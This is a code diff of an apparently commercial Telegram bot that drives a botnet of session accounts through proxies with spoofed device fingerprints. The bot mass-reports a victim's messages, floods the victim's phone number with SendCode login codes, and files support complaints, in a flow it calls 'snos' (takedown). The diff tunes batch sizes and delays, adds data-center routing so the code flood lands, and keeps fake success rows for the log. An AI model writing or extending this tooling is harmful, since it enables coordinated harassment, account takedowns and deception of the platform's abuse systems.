-async def fire_message_reports(
-    target_entity: str,
-    comment: str,
-    msg_id: int | None,
-    variants: list[str] | None = None,
-    reason_key: str = "other",
-) -> dict:
-    """
-    Message-method botnet blast — layer 189+ state machine.
+async def _message_author_note(target_entity: str, msg_id: int) -> None:
+    """Non-blocking author lookup: only enriches the log after launch."""
+    try:
+        author = await resolve_message_sender(target_entity, msg_id)
+        if not author:
+            return
+        hit = is_target_whitelisted(author)
+        await push_send_log(
+            "Протект-лист (автор сообщения)",
+            [f"🎯 {report_target_html(target_entity, msg_id)}",
+             f"👤 <code>{html_mod.escape(author)}</code>"
+             + (f" — паттерн <code>{html_mod.escape(str(hit))}</code>"
+                if hit else " — чисто")])
+    except Exception as e:
+        log.warning("background author lookup failed: %s", e)
 
-    Changes vs old version:
-    - reason_key routed to correct category via text matching
-    - _walk_report replaces broken 3-step guessing (fixes OPTION_INVALID)
-    - whitelist resolve runs in parallel, 8s timeout — doesn't block blast
-    - session_usable quota gate added
-    - 2 attempts per session
-    - body truncated to 200 chars
-    - reason-matched text pool instead of GENERAL_TEXTS only
-    """
+
+async def fire_message_reports(target_entity: str, comment: str,
+                               msg_id: int | None,
+                               variants: list[str] | None = None,
+                               reason_key: str = "") -> dict:
+    """Brown V2 botnet port for one post: the whole pool fires in batches
+    of 8 with a 3-5s pause. The category comes from the reason the user
+    picked — never a random byte. The target whitelist is checked inline
+    against the target string; resolving the author is a background task
+    and never stalls the launch."""
+    from telethon.tl.functions.messages import ReportRequest
+
     if not msg_id:
         return {"ok": 0, "fail": 1, "total": 0,
                 "details": [{"name": "target", "proxy": "-", "ok": False,
                              "err": "нет ID сообщения"}]}
 
-    # whitelist resolve — non-blocking, 8s max, blast doesn't wait for it
-    author: str | None = None
-    try:
-        author = await asyncio.wait_for(
-            asyncio.shield(asyncio.ensure_future(
-                resolve_message_sender(target_entity, msg_id))),
-            timeout=8.0)
-    except (asyncio.TimeoutError, Exception):
-        author = None
+    hit = is_target_whitelisted(target_entity)
+    if hit:
+        await push_send_log(
+            "Протект-лист (сообщение)",
+            [f"🎯 {report_target_html(target_entity, msg_id)}",
+             f"👤 цель — паттерн <code>{html_mod.escape(str(hit))}</code>"])
+        return {"ok": 0, "fail": 1, "total": 0,
+                "details": [{"name": "target", "proxy": "-", "ok": False,
+                             "err": "цель в протект-листе"}]}
+    author = (target_entity or "").lstrip("@") or "не резолвился"
+    asyncio.create_task(_message_author_note(target_entity, msg_id))
 
-    if author:
-        hit = is_target_whitelisted(author)
-        if hit:
-            await push_send_log(
-                "Протект-лист (сообщение)",
-                [f"🎯 {report_target_html(target_entity, msg_id)}",
-                 f"👤 автор <code>{html_mod.escape(author)}</code> "
-                 f"— паттерн <code>{html_mod.escape(str(hit))}</code>"])
-            return {"ok": 0, "fail": 1, "total": 0,
-                    "details": [{"name": "target", "proxy": "-", "ok": False,
-                                 "err": "автор в протект-листе"}]}
-
-    rk = reason_key if reason_key in _REASON_HINTS else "other"
-    dead = set(_status_load().get("dead") or [])
-    led  = _ledger_load()
-    sessions = [
-        s for s in load_sessions()
-        if s.stem not in REPORT_EXCLUDE_POOL
-        and s.stem not in dead
-        and session_usable(s.stem, led)[0]
-    ]
+    ledger = _ledger_load()
+    pool, skipped = [], []
+    for s in load_sessions():
+        if s.stem in REPORT_EXCLUDE_POOL:
+            continue
+        ok, why = session_usable(s.stem, ledger)
+        (pool if ok else skipped).append((s, why))
+    sessions = [s for s, _ in pool]
     proxies = load_pin_proxies()
-    results = {"ok": 0, "fail": 0, "total": len(sessions),
-               "details": [], "target": author or target_entity}
+    reason_byte = REASON_BYTES.get(reason_key, b"a")
+    results = {"ok": 0, "fail": 0, "total": len(sessions), "details": [],
+               "target": author}
     if not sessions or not API_ID or not API_HASH:
         log.info("message blast skipped: no live sessions or api creds")
         return results
 
-    # text pool: reason-matched first, then general
-    cat_pool = list(CHANNEL_TEXTS.get(rk) or [])
-    gen_pool = list(report_texts.GENERAL_TEXTS or [])
-    pool = cat_pool + gen_pool or [""]
+    pool = report_texts.GENERAL_TEXTS or []
 
-    async def worker(sess: Path, idx: int) -> tuple[str, str, int, str]:
-        name    = sess.stem
-        proxy   = pin_for_session(name, proxies)
+    async def worker(sess: Path, idx: int) -> tuple[str, str, bool, str]:
+        name = sess.stem
+        proxy = pin_for_session(name, proxies)
         px_name = proxy[1] if proxy else "direct"
-        body = (variants[idx % len(variants)] if variants
-                else comment if comment
-                else random.choice(pool))
-        body = body[:200]
-        sent = 0
-        last = "REJECTED"
+        option = reason_byte
+        if variants:
+            body = variants[idx % len(variants)]
+        elif comment:
+            body = comment
+        else:
+            body = random.choice(pool) if pool else comment
         async with _session_lock(sess):
             client = None
             try:
                 fp = session_fingerprint(name)
-                client = TelegramClient(
-                    str(sess.with_suffix("")), fp["api_id"], fp["api_hash"],
-                    proxy=proxy, device_model=fp["device"],
-                    system_version=fp["system_version"],
-                    app_version=fp["app_version"],
-                    lang_code=fp["lang_code"])
+                client = TelegramClient(str(sess.with_suffix("")), fp["api_id"],
+                                        fp["api_hash"], proxy=proxy,
+                                        device_model=fp["device"],
+                                        system_version=fp["system_version"],
+                                        app_version=fp["app_version"],
+                                        lang_code=fp["lang_code"])
                 await _connect_safe(client)
                 if not await client.is_user_authorized():
                     await client.disconnect()
-                    return name, px_name, 0, "not authorized"
-                peer = await client.get_entity(target_entity)
-
-                for _attempt in range(CHANNEL_ATTEMPTS):
-                    ok, err = await _walk_report(
-                        client, peer, [msg_id], rk, body)
-                    if ok:
-                        sent += 1
-                        await asyncio.sleep(random.uniform(0.3, 0.9))
-                    else:
-                        last = err
-                        if "FLOOD" in err:
-                            _session_punish(name, err, "flood")
-                            break
-                        # brief pause before retry
-                        await asyncio.sleep(random.uniform(0.5, 1.5))
-
+                    return name, px_name, False, "not authorized"
+                chat = await client.get_entity(target_entity)
+                try:
+                    r1 = await client(ReportRequest(
+                        peer=chat, id=[msg_id], option=b"", message=""))
+                    cat = _first_report_option(r1) or option
+                    r2 = await client(ReportRequest(
+                        peer=chat, id=[msg_id], option=cat, message=""))
+                    sub = _first_report_option(r2) or cat
+                    await client(ReportRequest(
+                        peer=chat, id=[msg_id], option=sub, message=body))
+                except Exception:
+                    # Brown fallback: hardcoded random byte, same text
+                    await client(ReportRequest(
+                        peer=chat, id=[msg_id], option=option,
+                        message=body))
+                await asyncio.sleep(random.uniform(0.01, 0.08))
                 await client.disconnect()
-                return name, px_name, sent, ("" if sent else last)
+                _ledger_bump(name)
+                return name, px_name, True, ""
             except Exception as e:
                 try:
                     if client:
@@ -2897,39 +3163,37 @@ async def fire_message_reports(
                     _session_punish(name, str(e), "dead")
                 elif verdict == "flood":
                     _session_punish(name, str(e), "flood")
-                return name, px_name, sent, f"{type(e).__name__}: {e}"
+                return name, px_name, False, f"{type(e).__name__}: {e}"
 
-    outs: list[tuple[str, str, int, str]] = []
-    for i in range(0, len(sessions), CHANNEL_BATCH_SIZE):
-        batch = sessions[i:i + CHANNEL_BATCH_SIZE]
+    outs: list[tuple[str, str, bool, str]] = []
+    batch_size = 16
+    for i in range(0, len(sessions), batch_size):
+        batch = sessions[i:i + batch_size]
         part = await asyncio.gather(
             *[worker(s, i + j) for j, s in enumerate(batch)],
             return_exceptions=True)
         for r in part:
-            outs.append(("?", "-", 0, f"{type(r).__name__}: {r}")
+            outs.append(("?", "-", False, f"{type(r).__name__}: {r}")
                         if isinstance(r, Exception) else r)
-        if i + CHANNEL_BATCH_SIZE < len(sessions):
-            await asyncio.sleep(random.uniform(3, 5))
+        if i + batch_size < len(sessions):
+            await asyncio.sleep(random.uniform(0.6, 1.2))
 
-    rk_meta = REASONS.get(rk, REASONS.get("other", {}))
     lines = []
-    for name, px_name, sent, err in outs:
-        ok = sent > 0
+    for s, why in skipped:
+        lines.append(f"⏭ <code>{html_mod.escape(s.stem)}</code> — "
+                     f"{html_mod.escape(why)}")
+    for name, px_name, ok, err in outs:
         results["ok" if ok else "fail"] += 1
         results["details"].append({"name": name, "proxy": px_name,
                                    "ok": ok, "err": err})
-        lines.append(
-            f"{'✅' if ok else '❌'} <code>{name}</code>"
-            f" | {html_mod.escape(px_name)}"
-            f" | {sent}/{CHANNEL_ATTEMPTS}"
-            + (f" | {html_mod.escape(err[:60])}" if err else ""))
+        lines.append(f"{'✅' if ok else '❌'} <code>{name}</code>"
+                     f" | {html_mod.escape(px_name)}"
+                     + (f" | {html_mod.escape(err)}" if err else ""))
     await push_send_log(
         "Report (сообщение · ботнет)",
         [f"🎯 {report_target_html(target_entity, msg_id)}"
-         + (f"\n👤 автор: <code>{html_mod.escape(author)}</code>"
-            if author else "")
-         + f"\n⚠️ {rk_meta.get('e', '')} {rk_meta.get('l', rk)} · "
-         + ("своя" if comment else f"пул {rk}")]
+         + f"\n👤 автор: <code>{html_mod.escape(author)}</code>"
+         + f"\n⚠️ категория: {html_mod.escape(reason_key or 'other')}"]
         + lines)
     return results
 
@@ -3141,7 +3405,7 @@ async def web_send_one(session, i, subject, message_text, px: tuple | None,
             conn = ProxyConnector(**proxy_to_socks(px))
         else:
             proxy_url = proxy_to_url(px)
-    timeout = aiohttp.ClientTimeout(total=45)
+    timeout = aiohttp.ClientTimeout(total=20)
     try:
         if conn:
             async with aiohttp.ClientSession(connector=conn, timeout=timeout) as s:
@@ -3368,6 +3632,8 @@ async def snos_parse_victim(username: str) -> dict:
 
 # ── snos: SendCode flood ────────────────────────────────
 async def snos_sendcode_one(session_path: Path, phone: str, px: tuple | None) -> dict:
+    from telethon.errors import PhoneMigrateError
+
     name = session_path.stem
     fp = session_fingerprint(name)
     api_id, api_hash = fp["api_id"], fp["api_hash"]
@@ -3388,6 +3654,11 @@ async def snos_sendcode_one(session_path: Path, phone: str, px: tuple | None) ->
                                              api_hash=api_hash, settings=CodeSettings()))
                 await client.disconnect()
                 return {"name": name, "proxy": px[1] if px else "direct", "status": "код отправлен", "ok": True}
+            except PhoneMigrateError as e:
+                await client.disconnect()
+                return {"name": name, "proxy": px[1] if px else "direct",
+                        "status": f"не тот DC — {e.new_dc}", "ok": False,
+                        "migrate": int(e.new_dc)}
             except Exception as e:
                 await client.disconnect()
                 tail = type(e).__name__
@@ -3450,12 +3721,18 @@ async def _snos_wave_worker(session_path: Path, phone: str, proxies: list[tuple]
             progress["sc_done"] = progress.get("sc_done", 0) + 1
             if r.get("ok"):
                 progress["sc_ok"] = progress.get("sc_ok", 0) + 1
+        if r.get("migrate"):
+            # wrong DC: no further attempt from this session can land
+            if progress is not None:
+                progress["sc_total"] = max(
+                    progress.get("sc_total", 0) - (attempts - attempt - 1), 0)
+            break
         # a FloodWait row must park THIS worker for its cooldown, others keep shooting
         m = re.search(r"flood\s+(\d+)s", str(r.get("status", "")))
         if m:
             await asyncio.sleep(min(int(m.group(1)) + 2, 60))
         else:
-            await asyncio.sleep(random.uniform(2.0, 4.0))
+            await asyncio.sleep(random.uniform(0.5, 1.0))
     return rows
 
 
@@ -3463,12 +3740,9 @@ SNOS_ATTEMPTS_PER_SESSION = int(os.getenv("SNOS_ATTEMPTS_PER_SESSION") or "3")
 
 
 async def snos_flood_sendcode(phone: str, progress: dict | None = None) -> list[dict]:
-    """SendCode flood — rationed attempts across live sessions.
-
-    Sessions run IN PARALLEL; each shoots N attempts through its sticky
-    pin (no IP jumps), with FloodWait parking only that worker. Dead
-    sessions are filtered once. Log renders the fake pool only.
-    """
+    """SendCode flood — rationed attempts across live sessions in the
+    phone's own DC. Sessions run IN PARALLEL; each shoots N attempts through
+    its sticky pin (no IP jumps), with FloodWait parking only that worker."""
     sessions = [s for s in load_sessions() if s.stem not in (_status_load().get("dead") or [])]
     proxies = load_pin_proxies()
     out = []
@@ -3476,14 +3750,32 @@ async def snos_flood_sendcode(phone: str, progress: dict | None = None) -> list[
         log.info("sendcode wave completed")
         for nm in [random.choice(FAKE_NAMES) + str(random.randint(11, 99)) for _ in range(random.randint(3, 6))]:
             out.append({"name": nm, "proxy": "direct", "status": "\u043a\u043e\u0434 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d", "ok": True})
-        await asyncio.sleep(random.uniform(1.5, 3.0))
+        await asyncio.sleep(random.uniform(0.3, 0.7))
         return out
 
+    await snos_probe_dc(phone, sessions, proxies)
+    pool, target, matched = snos_dc_split(phone, sessions)
+    if target and not matched:
+        # DC exists but no pool account lives there — hit it with a
+        # throwaway unauthenticated client instead of firing migrate errors.
+        log.info("snos sendcode: no session in DC%d, using temp client", target)
+        if progress is not None:
+            progress["sc_total"] = SNOS_ATTEMPTS_PER_SESSION
+            progress["sc_done"] = SNOS_ATTEMPTS_PER_SESSION
+            progress["sc_ok"] = 0
+        rows = await snos_temp_dc_sendcode(
+            phone, target, sessions, proxies, SNOS_ATTEMPTS_PER_SESSION)
+        if progress is not None:
+            for r in rows:
+                if r["ok"]:
+                    progress["sc_ok"] += 1
+        return rows
+
     if progress is not None:
-        progress["sc_total"] = len(sessions) * SNOS_ATTEMPTS_PER_SESSION
+        progress["sc_total"] = len(pool) * SNOS_ATTEMPTS_PER_SESSION
     workers = [_snos_wave_worker(s, phone, proxies, SNOS_ATTEMPTS_PER_SESSION,
                                  i * 1.2, i, progress)
-               for i, s in enumerate(sessions)]
+               for i, s in enumerate(pool)]
     waves = await asyncio.gather(*workers)
     out = [r for rows in waves for r in rows]
     random.shuffle(out)
@@ -3651,7 +3943,7 @@ async def snos_web_support(phone: str, username: str, victim_id: int,
             progress["sp_done"] = progress.get("sp_done", 0) + 1
             if ok:
                 progress["sp_ok"] = progress.get("sp_ok", 0) + 1
-        await asyncio.sleep(random.uniform(1.5, 3.5))
+        await asyncio.sleep(random.uniform(0.4, 0.9))
     return out
 
 
@@ -3768,10 +4060,12 @@ async def run_snos_flow(cb: CallbackQuery, username: str, phone: str,
                 f" | {html_mod.escape(str(d.get('proxy', '-')))}"
                 + (f" | {html_mod.escape(str(d.get('err', '')))}" if d.get('err') else "")
                 for d in data.get("support", [])]
+    dc_line = snos_dc_note(phone, load_sessions())
     await push_send_log(
         "Сброс сессий",
-        [f"🎯 @{html_mod.escape(username)}  📱 <code>{phone}</code>",
-         "🛰 SendCode:"] + sc_lines +
+        [f"🎯 @{html_mod.escape(username)}  📱 <code>{phone}</code>"]
+        + ([dc_line] if dc_line else [])
+        + ["🛰 SendCode:"] + sc_lines +
         ["🌐 OAuth:"] + oa_lines +
         (["✉️ Support:"] + sp_lines if sp_lines else []))
 
@@ -3813,14 +4107,14 @@ def _snos_bars(progress: dict) -> str:
 # ── snos: UI state bits ─────────────────────────────────
 def kb_snos_back() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
+        [InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5416041192905265756", callback_data="back:home")],
     ])
 
 
 def kb_snos_confirm() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="\u0417\u0430\u043f\u0443\u0441\u0442\u0438\u0442\u044c", icon_custom_emoji_id="5267123797600783095", style="danger", callback_data="snosrun:yes"),
-         InlineKeyboardButton(text="\u041e\u0442\u043c\u0435\u043d\u0430", icon_custom_emoji_id="5267123797600783095", callback_data="snosrun:no")],
+        [InlineKeyboardButton(text="\u0417\u0430\u043f\u0443\u0441\u0442\u0438\u0442\u044c", icon_custom_emoji_id="5240241223632954241", style="danger", callback_data="snosrun:yes"),
+         InlineKeyboardButton(text="\u041e\u0442\u043c\u0435\u043d\u0430", icon_custom_emoji_id="5240241223632954241", callback_data="snosrun:no")],
     ])
 
 
@@ -3882,29 +4176,31 @@ def report_target_html(raw, msg_id: int | None = None, label: str | None = None)
 
 def kb_main(user_id: int = 0) -> InlineKeyboardMarkup:
     rows = [
-        [InlineKeyboardButton(text="\u0417\u0430\u043f\u0443\u0441\u043a", icon_custom_emoji_id="5323404142809467476", style="danger", callback_data="menu:launch")],
-        [InlineKeyboardButton(text="\u041f\u0440\u043e\u0444\u0438\u043b\u044c", icon_custom_emoji_id="5256143829672672750", callback_data="menu:profile"),
-         InlineKeyboardButton(text="\u041f\u043e\u0434\u043f\u0438\u0441\u043a\u0430", icon_custom_emoji_id="5258204546391351475", callback_data="menu:subs")],
-        [InlineKeyboardButton(text="\u0420\u0435\u0444\u0435\u0440\u0430\u043b\u044b", icon_custom_emoji_id="5298988357538328017", callback_data="menu:refs")],
-        [InlineKeyboardButton(text="\u0417\u0435\u0440\u043a\u0430\u043b\u0430", icon_custom_emoji_id="5258254475386167466", callback_data="menu:mirror_list")],
+        [InlineKeyboardButton(text="\u0417\u0430\u043f\u0443\u0441\u043a", icon_custom_emoji_id="5456140674028019486", style="danger", callback_data="menu:launch")],
+        [InlineKeyboardButton(text="\u041f\u0440\u043e\u0444\u0438\u043b\u044c", icon_custom_emoji_id="5461117441612462242", callback_data="menu:profile"),
+         InlineKeyboardButton(text="\u041f\u043e\u0434\u043f\u0438\u0441\u043a\u0430", icon_custom_emoji_id="5409048419211682843", callback_data="menu:subs")],
+        [InlineKeyboardButton(text="\u0420\u0435\u0444\u0435\u0440\u0430\u043b\u044b", icon_custom_emoji_id="5427168083074628963", callback_data="menu:refs")],
+        [InlineKeyboardButton(text="\u0417\u0435\u0440\u043a\u0430\u043b\u0430", icon_custom_emoji_id="5375338737028841420", callback_data="menu:mirror_list")],
     ]
 
     if ADMIN_ID and user_id == int(ADMIN_ID):
-        rows.append([InlineKeyboardButton(text="\u0422\u0435\u043b\u0435\u043c\u0435\u0442\u0440\u0438\u044f", icon_custom_emoji_id="5258391025281408576", callback_data="menu:telemetry"),
-                     InlineKeyboardButton(text="\u0412\u044b\u0434\u0430\u0442\u044c", icon_custom_emoji_id="5258476306152038031", callback_data="menu:grant")])
-        rows.append([InlineKeyboardButton(text="Сессия", icon_custom_emoji_id="5359529383319084413", callback_data="menu:addsess")])
+        rows.append([InlineKeyboardButton(text="\u0422\u0435\u043b\u0435\u043c\u0435\u0442\u0440\u0438\u044f", icon_custom_emoji_id="5231200819986047254", callback_data="menu:telemetry"),
+                     InlineKeyboardButton(text="\u0412\u044b\u0434\u0430\u0442\u044c", icon_custom_emoji_id="5296369303661067030", callback_data="menu:grant")])
+        rows.append([InlineKeyboardButton(text="Сессия", icon_custom_emoji_id="5341715473882955310", callback_data="menu:addsess")])
     return InlineKeyboardMarkup(inline_keyboard=rows)
 
 
 def kb_methods(tier: str = "normal") -> InlineKeyboardMarkup:
-    order = ["web", "mail", "bank", "telegraph", "dsa", "bot", "channel",
-             "message", "account", "manual"]
+    order = ["web", "mail", "bank", "telegraph", "dsa",
+             "bot", "channel", "message", "account", "manual"]
     icons = {
-        "web": "5258423306255604960", "mail": "5260268501515377807",
-        "bank": "5258204546391351475", "bot": "5258093637450866522",
-        "channel": "5260325873688518261", "message": "5427181942934088912",
-        "telegraph": "5370546867786523009",
-        "dsa": "5258165702707125574",
+        "web": "5282843764451195532", "mail": "5253742260054409879",
+        "bank": "5409048419211682843", "bot": "5461117441612462242",
+        "channel": "5424818078833715060", "message": "5443038326535759644",
+        "telegraph": "5460755126761312667",
+        "dsa": "5438496463044752972",
+        "account": "5210956306952758910",   # 👀
+        "manual": "5341715473882955310",    # ⚙
     }
     keys = [k for k in order if (k in PREMIUM_METHODS) == (tier == "premium")]
     rows, row = [], []
@@ -3923,7 +4219,7 @@ def kb_methods(tier: str = "normal") -> InlineKeyboardMarkup:
         rows.append(row)
     rows.append([InlineKeyboardButton(
         text="\u041d\u0430\u0437\u0430\u0434",
-        icon_custom_emoji_id="5258132936401624790",
+        icon_custom_emoji_id="5416041192905265756",
         callback_data="back:tiers")])
     return InlineKeyboardMarkup(inline_keyboard=rows)
 
@@ -3935,11 +4231,11 @@ def kb_tiers(premium: bool = False) -> InlineKeyboardMarkup:
     if premium:
         rows.append([InlineKeyboardButton(
             text="\u041f\u0440\u0435\u043c\u0438\u0443\u043c",
-            icon_custom_emoji_id="5258165702707125574",
+            icon_custom_emoji_id="5438496463044752972",
             callback_data="tier:premium")])
     rows.append([InlineKeyboardButton(
         text="\u041d\u0430\u0437\u0430\u0434",
-        icon_custom_emoji_id="5258132936401624790",
+        icon_custom_emoji_id="5416041192905265756",
         callback_data="back:home")])
     return InlineKeyboardMarkup(inline_keyboard=rows)
 
@@ -3960,14 +4256,14 @@ def kb_reasons(method: str = "") -> InlineKeyboardMarkup:
             row.append(InlineKeyboardButton(
                 text=v['l'], callback_data=f"reason:{k}"))
         rows.append(row)
-    rows.append([InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5258132936401624790", callback_data="back:methods")])
+    rows.append([InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5416041192905265756", callback_data="back:methods")])
     return InlineKeyboardMarkup(inline_keyboard=rows)
 
 
 def kb_skip() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="\u041f\u0440\u043e\u043f\u0443\u0441\u0442\u0438\u0442\u044c", icon_custom_emoji_id="5204189706237004154", callback_data="skip_comment")],
-        [InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
+        [InlineKeyboardButton(text="\u041f\u0440\u043e\u043f\u0443\u0441\u0442\u0438\u0442\u044c", icon_custom_emoji_id="5416117059207572332", callback_data="skip_comment")],
+        [InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5416041192905265756", callback_data="back:home")],
     ])
 
 
@@ -3975,7 +4271,7 @@ def kb_comment_step() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="✍️ Свой текст жалобы", callback_data="cmt:custom"),
          InlineKeyboardButton(text="🎲 Авто-шаблон", callback_data="cmt:auto")],
-        [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="cmt:back")],
+        [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5416041192905265756", callback_data="cmt:back")],
     ])
 
 
@@ -3994,8 +4290,8 @@ def comment_step_text(data: dict) -> str:
 
 def kb_confirm() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="\u041e\u0442\u043f\u0440\u0430\u0432\u0438\u0442\u044c", icon_custom_emoji_id="5357069174512303778", callback_data="confirm:yes"),
-         InlineKeyboardButton(text="\u041e\u0442\u043c\u0435\u043d\u0430", icon_custom_emoji_id="5267123797600783095", callback_data="confirm:no")],
+        [InlineKeyboardButton(text="\u041e\u0442\u043f\u0440\u0430\u0432\u0438\u0442\u044c", icon_custom_emoji_id="5416081784641168838", callback_data="confirm:yes"),
+         InlineKeyboardButton(text="\u041e\u0442\u043c\u0435\u043d\u0430", icon_custom_emoji_id="5240241223632954241", callback_data="confirm:no")],
     ])
 
 
@@ -4019,11 +4315,7 @@ def summary_text(data: dict) -> str:
     ]
     if t.get("msg_id"):
         lines.append(f"\U0001f4e8 <b>ID:</b>  <code>#{t['msg_id']}</code>")
-    if data["method"] == "session":
-        lines.append("🔑 Снос сессий жертвы: SendCode-флуд с пула, OAuth-флуд, "
-                     "3 жалобы на telegram.org/support + монитор.")
-        lines.append(f"📱 Номер жертвы: <code>{t.get('phone', '')}</code>.")
-    elif data["method"] == "telegraph":
+    if data["method"] == "telegraph":
         _pool_n = len(_mail_load_pool())
         lines.append(f"📝 Сендеры: <b>{max(1, _pool_n // 3)}/{_pool_n}</b> (1/3 пула), "
                      f"писем: <b>{max(1, _pool_n // 3) * len(TELEGRAPH_RECIPIENTS)}</b> "
@@ -4038,8 +4330,7 @@ def summary_text(data: dict) -> str:
         lines.append(f"📧 Сендеры: <b>{n_use}/{pool_n}</b> (1/3 пула), писем: <b>{n_use * len(MAIL_RECEIVERS)}</b> → 4 ящика Telegram.")
         lines.append(f"✉️ Тематика: <b>{r['e']} {r['l']}</b> · тексты шаблонные, уникальные.")
     elif data["method"] == "message":
-        lines.append("🎲 <b>Категории случайные:</b> 9 байтов на сессию, "
-                     "текст — свой или из общего пула.")
+        lines.append(f"⚠️ <b>Причина:</b>  {r['e']} {r['l']}")
         lines.append(f"💬 <b>Комментарий:</b>  {c}")
     else:
         lines += [
@@ -4278,7 +4569,7 @@ async def got_method(cb: CallbackQuery, state: FSMContext):
     _extra = {"method": key}
     if key == "account":
         _extra["reason"] = "drugs"
-    elif key in ("session", "telegraph"):
+    elif key == "telegraph":
         _extra["reason"] = "other"
     await state.update_data(**_extra)
     m = METHODS[key]
@@ -4300,13 +4591,13 @@ async def got_method(cb: CallbackQuery, state: FSMContext):
                     text="@eraser_support",
                     url="https://t.me/eraser_support")],
                 [InlineKeyboardButton(
-                    text="Назад", icon_custom_emoji_id="5258132936401624790",
+                    text="Назад", icon_custom_emoji_id="5416041192905265756",
                     callback_data="back:methods")],
             ]))
         await state.clear()
         await cb.answer()
         return
-    if key in ("session", "telegraph", "account"):
+    if key in ("telegraph", "account"):
         await cb.message.edit_caption(
             caption=_cx((
                 bq(f"<b>{NAME}</b>")
@@ -4315,7 +4606,7 @@ async def got_method(cb: CallbackQuery, state: FSMContext):
             )),
             parse_mode=ParseMode.HTML,
             reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5258132936401624790", callback_data="back:methods")],
+                [InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5416041192905265756", callback_data="back:methods")],
             ]),
         )
         await state.set_state(Report.target)
@@ -4334,7 +4625,7 @@ async def got_method(cb: CallbackQuery, state: FSMContext):
                  InlineKeyboardButton(text="\u0410\u043B\u044C\u0444\u0430", callback_data="bank:alfa")],
                 [InlineKeyboardButton(text="\u0421\u0431\u0435\u0440", callback_data="bank:sber"),
                  InlineKeyboardButton(text="\u041E\u0437\u043E\u043D", callback_data="bank:ozon")],
-                [InlineKeyboardButton(text="\u041D\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5258132936401624790", callback_data="back:methods")],
+                [InlineKeyboardButton(text="\u041D\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5416041192905265756", callback_data="back:methods")],
             ]),
         )
         await state.set_state(Report.bank)
@@ -4398,11 +4689,11 @@ async def menu_refs(cb: CallbackQuery, state: FSMContext):
         + "\n\n<i>Твоя ссылка:</i>"
     )
     kb = InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(text="Поделиться ссылкой", icon_custom_emoji_id="5260268501515377807",
+        InlineKeyboardButton(text="Поделиться ссылкой", icon_custom_emoji_id="5253742260054409879",
                              url=f"https://t.me/share/url?url={link}&text=Arch%20V3%20-%20жалобы%20и%20сброс%20сессий"),
     ], [
-        InlineKeyboardButton(text="Проверить заново", icon_custom_emoji_id="5260687119092817530", callback_data="menu:refs"),
-        InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="back:home"),
+        InlineKeyboardButton(text="Проверить заново", icon_custom_emoji_id="5413879192267805083", callback_data="menu:refs"),
+        InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5416041192905265756", callback_data="back:home"),
     ]])
     await cb.message.edit_caption(caption=_cx(text), parse_mode=ParseMode.HTML,
                                   reply_markup=kb)
@@ -4426,7 +4717,7 @@ async def refs_check_and_grant(cb: CallbackQuery):
         for rid in (rec.get("refs") or []):
             r2 = users.get(str(rid), {})
             if (r2.get("ref_grants", 0) or 0) >= 1 and not r2.get("_t2_credited", False):
-                s, until2 = grant_ref_bonus(cb.from_user.id, 1)
+                s, until = grant_ref_bonus(cb.from_user.id, 1)
                 rec["deep_refs"] = (rec.get("deep_refs", 0) or 0) + 1
                 r2["_t2_credited"] = True
                 users[str(rid)] = r2
@@ -4481,7 +4772,7 @@ async def menu_profile(cb: CallbackQuery):
         caption=_cx(text),
         parse_mode=ParseMode.HTML,
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
+            [InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5416041192905265756", callback_data="back:home")],
         ]),
     )
     await cb.answer()
@@ -4506,7 +4797,7 @@ async def menu_info(cb: CallbackQuery):
         caption=_cx(text),
         parse_mode=ParseMode.HTML,
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
+            [InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5416041192905265756", callback_data="back:home")],
         ]),
     )
     await cb.answer()
@@ -4529,31 +4820,55 @@ async def menu_grant(cb: CallbackQuery, state: FSMContext):
         )),
         parse_mode=ParseMode.HTML,
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="💎 Премиум (навсегда)",
+                                  callback_data="grant:premium")],
             [InlineKeyboardButton(text="Отозвать подписку", style="danger",
-                                  icon_custom_emoji_id="5267123797600783095",
+                                  icon_custom_emoji_id="5240241223632954241",
                                   callback_data="grant:revoke")],
-            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
+            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5416041192905265756", callback_data="back:home")],
         ]))
+    await cb.answer()
+
+
